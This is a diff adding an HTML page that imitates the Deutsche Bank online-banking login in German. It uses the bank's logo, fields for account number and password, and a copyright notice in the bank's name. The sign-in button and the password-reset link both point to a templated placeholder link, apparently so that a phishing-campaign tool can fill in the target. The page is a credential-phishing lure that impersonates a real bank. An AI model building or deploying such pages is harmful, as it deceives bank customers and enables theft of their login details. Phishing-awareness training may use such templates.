@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Deutsche Bank Anmeldung</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 150px;
+    }
+    h2 {
+      color: #0055a5;
+      text-align: center;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      color: #333;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    #show-password {
+      position: relative;
+      cursor: pointer;
+      float: right;
+      margin-top: -30px;
+      margin-right: 10px;
+      color: #0055a5;
+    }
+    .form-group input[type="submit"] {
+      background-color: #0055a5;
+      color: white;
+      cursor: pointer;
+      border: none;
+      padding: 10px;
+      border-radius: 5px;
+      font-family: 'Segoe UI Regular';
+      font-weight: 600;
+      font-size: 14px;
+    }
+    .form-group input[type="submit"]:hover {
+      background-color: #003d73;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+    .footer a {
+      color: #0055a5;
+      text-decoration: none;
+    }
+    .submit-button-link {
+      display: block;
+      margin: 20px auto;
+      color: white;
+      background: rgb(0, 120, 212);
+      border: 5px solid rgb(0, 120, 212);
+      border-radius: 5px;
+      padding: 10px 15px;
+      text-align: center;
+      font-family: 'Segoe UI Regular';
+      font-weight: 600;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .submit-button-link:hover {
+      background-color: #003d73;
+      border-color: #003d73;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Deutsche_Bank-Logo.svg/640px-Deutsche_Bank-Logo.svg.png" alt="Deutsche Bank">
+    </div>
+    <h2>Melden Sie sich bei Ihrem Konto an</h2>
+    <form rel="noopener" action="#" method="#" target="_self">
+      <div class="form-group">
+        <label for="username">Kontonummer oder Benutzername</label>
+        <input type="text" id="username" name="username" class="input-field-loginPage" required="">
+      </div>
+      <div class="form-group">
+        <label for="password">Passwort</label>
+        <input type="password" id="password-field" name="password" class="input-field-loginPage" required="">
+      </div>
+      <div class="form-group">
+
+      </div>
+    </form>
+    
+    <!-- Added "Submit" button with link functionality -->
+    <a href="${submitLink}" target="_self" class="submit-button-link" rel="noopener">Anmelden</a>
+
+    <div class="footer">
+      <p>Passwort vergessen? <a rel="noopener" href="${submitLink}" target="_self">Hier zurücksetzen</a>.</p>
+      <p>© 2024 Deutsche Bank. Alle Rechte vorbehalten.</p>
+    </div>
+  </div>
+</body>
+</html>
